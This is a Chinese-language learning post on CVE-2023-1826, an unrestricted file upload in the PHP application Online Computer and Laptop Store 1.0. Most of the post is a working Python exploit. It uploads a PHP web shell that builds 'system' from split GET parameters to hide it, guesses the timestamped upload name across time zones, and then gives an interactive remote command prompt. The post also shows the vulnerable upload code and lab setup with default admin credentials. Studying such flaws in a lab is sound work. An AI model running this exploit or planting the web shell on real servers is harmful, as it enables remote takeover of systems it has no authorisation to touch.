我想要学习如何写poc和exp，在exploit上浏览近期exp找到一个简单些的漏洞CVE-2023-1826

exp&poc代码：

```python
# python3
import urllib.request
import urllib.parse
import time
from datetime import datetime, timezone
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("url", help="检测路径 例如：http://localhost/php-ocls")
parser.add_argument("-e", "--exp", help="漏洞利用，该选项缺省时为检测漏洞是否存在", action="store_true")
args = parser.parse_args()

poctext = "<?php echo 'success'; ?>"
# ?t=sy&m=st&p=em&rec=whoami
exptext = "<?php if($_GET['check'] == 'check') echo 'success';$t=$_GET['t'];$m=$_GET['m'];$p=$_GET['p'];$rce=$_GET['rce'];$tmp=$t.$m.$p;$tmp($rce); ?>"

# 上传文件，text为上传文件内容
def uploadfile(url, text):
    filename = "keyfile.php"
    filename = str(int(time.time())) + "_" + filename
    # 设置boundary标识符，可自定义
    boundary = "----------boundary"
    # 构建请求数据部分
    data = "--%s\r\n" % boundary
    data += "Content-Disposition: form-data; name='img'; filename='%s'\r\n" % filename
    data += "Content-Type: application/octet-stream\r\n\r\n"
    data += text
    data += "\r\n--%s--\r\n" % boundary
    # 文件上传路径
    req = urllib.request.Request(url + "/classes/SystemSettings.php?f=update_settings", data.encode("utf-8"))
    req.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    ttmp = []
    # 获取协调世界时的hour
    hour = datetime.now(timezone.utc).hour
    # 计算忽略secound后当前时间的不同时区的时间戳
    for i in range(-12,14):
        ttmp.append(int(datetime.now(timezone.utc).replace(second=0,hour=(hour + i)%24).timestamp()))
    response = urllib.request.urlopen(req)
    # 拼接服务器存储文件可能会用到的文件名
    filenames = [str(i) + "_" + filename for i in ttmp]
    # 判断文件存储到服务器后的url
    for i in filenames:
        hurl = checkfile(url + "/uploads/" + i)
        if hurl != "err" and hurl != "":
            return hurl
    print("利用失败")

# 判断
def checkfile(url):
    try:
        response = urllib.request.urlopen(url  + "?check=check")
        tmp = response.read().decode('utf-8')
        if tmp[0:7] == "success":
            # print("文件存放地址：" + url)
            return url
        return ""
    except (urllib.error.HTTPError) as e:
        return "err"

# 验证漏洞
def poc(url):
    hurl = uploadfile(url, poctext)
    response = urllib.request.urlopen(hurl)
    if response.read().decode('utf-8') == "success":
        print("漏洞存在！")

# 利用漏洞
def exp(url):
    hurl = uploadfile(url, exptext)
    while 1:
        com = input("com:")
        if com == "quit":
            break
        response = urllib.request.urlopen(hurl + "?t=sy&m=st&p=em&rce=" + str(com))
        print(response.read())

if __name__ == "__main__":
    url = args.url
    if args.exp:
        exp(url)
    else:
        poc(url)
```

**使用方法：**

python3 test.py url # 检测漏洞是否存在

python3 test.py url -e# 利用漏洞,输入quit退出

**适用于：**

Online Computer and Laptop Store 1.0

## 漏洞成因

位于classes/SystemSettings.php的漏洞关键代码：

```php
if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){
	$fname = 'uploads/'.strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
	$move = move_uploaded_file($_FILES['img']['tmp_name'],'../'. $fname);
	if(isset($_SESSION['system_info']['logo'])){
		$qry = $this->conn->query("UPDATE system_info set meta_value = '{$fname}' where meta_field = 'logo' ");
		if(is_file('../'.$_SESSION['system_info']['logo'])) unlink('../'.$_SESSION['system_info']['logo']);
	}else{
		$qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'logo' ");
	}
}
```

没有限制上传的文件类型就保存到服务器/uploads目录下，保存文件名格式为`时间戳_上传的文件名`，记得考虑时区。

## 环境搭建

* phpstudy

* [源码和供应商文档](https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-ocls.zip)

建议使用v5.3 php，后台账号：admin,密码admin&123
